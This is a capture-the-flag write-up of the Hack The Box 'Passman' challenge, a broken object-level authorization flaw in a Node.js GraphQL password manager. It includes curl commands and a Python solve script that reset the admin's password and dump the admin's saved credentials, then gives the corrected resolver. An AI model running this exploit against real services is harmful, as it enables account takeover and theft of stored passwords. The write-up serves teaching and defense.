## Overview

HTB Challenge: *Passman* — Web, Easy.

A Node.js password manager backed by a GraphQL API. The `UpdatePassword` mutation accepts the target username as a caller-supplied argument rather than deriving it from the authenticated JWT session, so any logged-in user can overwrite any other account's password — including the admin's. Retrieving the admin's saved passwords then yields the flag.

**[CWE-639](https://cwe.mitre.org/data/definitions/639.html)** — Authorization Bypass Through User-Controlled Key.

---

## The technique

The `UpdatePassword` GraphQL mutation checks only that a session cookie is present (`request.user` is truthy), but then passes `args.username` — the attacker-supplied value — directly to the database update call:

```js
resolve: async (root, args, request) => {
    if (!request.user) return reject(new GraphQLError('Authentication required!'));
    db.updatePassword(args.username, args.password);  // username from caller, not from JWT
```

Authentication and [authorization](https://cwe.mitre.org/data/definitions/862.html) are two different checks. The mutation verifies *who you are* but never verifies *whether you own the resource you're modifying*. Any authenticated account can therefore reset any other account's password.

## Solution

**Step 1 — Register an attacker account and log in**

```bash
# Register
curl -s -X POST http://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { RegisterUser(email:\"x@x.com\", username:\"attacker\", password:\"p\") { message } }"}'

# Login — token is the JWT used as the "session" cookie
curl -s -X POST http://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { LoginUser(username:\"attacker\", password:\"p\") { token } }"}'
```

**Step 2 — Reset admin's password (IDOR)**

Supply `username: "admin"` in the mutation args. The server accepts it because only authentication is checked, not ownership:

```bash
curl -s -X POST http://<target>/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<attacker-jwt>" \
  -d '{"query":"mutation { UpdatePassword(username: \"admin\", password: \"owned\") { message } }"}'
# → {"data":{"UpdatePassword":{"message":"Password updated successfully!"}}}
```

**Step 3 — Log in as admin, dump saved passwords**

```bash
# Login as admin with the new password
curl -s -X POST http://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { LoginUser(username:\"admin\", password:\"owned\") { token } }"}'

# Query admin's password vault
curl -s -X POST http://<target>/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<admin-jwt>" \
  -d '{"query":"{ getPhraseList { address username password } }"}'
# → flag is in the password field of the admin's igms.htb entry
```

**Full automated solve (`solve.py`)**

```python
#!/usr/bin/env python3
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost:1337"
BASE   = f"http://{TARGET}/graphql"

def gql(q, session=None):
    h = {"Content-Type": "application/json"}
    if session:
        h["Cookie"] = f"session={session}"
    return requests.post(BASE, json={"query": q}, headers=h).json()

gql('mutation { RegisterUser(email:"x@x.com", username:"attacker", password:"p") { message } }')
sess  = gql('mutation { LoginUser(username:"attacker", password:"p") { token } }')["data"]["LoginUser"]["token"]
gql(f'mutation {{ UpdatePassword(username: "admin", password: "owned") {{ message }} }}', sess)
admin = gql('mutation { LoginUser(username:"admin", password:"owned") { token } }')["data"]["LoginUser"]["token"]
for p in gql('{ getPhraseList { address username password } }', admin)["data"]["getPhraseList"]:
    print(f"[{p['address']}] {p['username']} : {p['password']}")
```

Run: `python3 solve.py <host>:<port>` → prints all of admin's saved entries, including the flag.

**Flag:** `HTB{...}`

## Why it worked

The server enforced *authentication* (is a session cookie present?) but not *object-level authorization* (does this session own the account being modified?). Because `args.username` was passed directly to `db.updatePassword()`, any authenticated user could target any row in the `users` table. This is a classic instance of [CWE-639](https://cwe.mitre.org/data/definitions/639.html) and maps to OWASP API3:2023 (Broken Object Level Authorization).

---

## Fix / defense

Derive the target account from the verified session, never from caller-supplied args:

```js
// Fixed resolver — subject comes from JWT, not from the mutation argument
resolve: async (root, args, request) => {
    if (!request.user) return reject(new GraphQLError('Authentication required!'));
    db.updatePassword(request.user.username, args.password);  // ← session-derived
```

For GraphQL APIs more broadly: apply per-field or per-resolver ownership checks using middleware such as [graphql-shield](https://github.com/dimatill/graphql-shield), and never trust any identifier that arrives inside the mutation arguments without verifying it matches the authenticated subject.
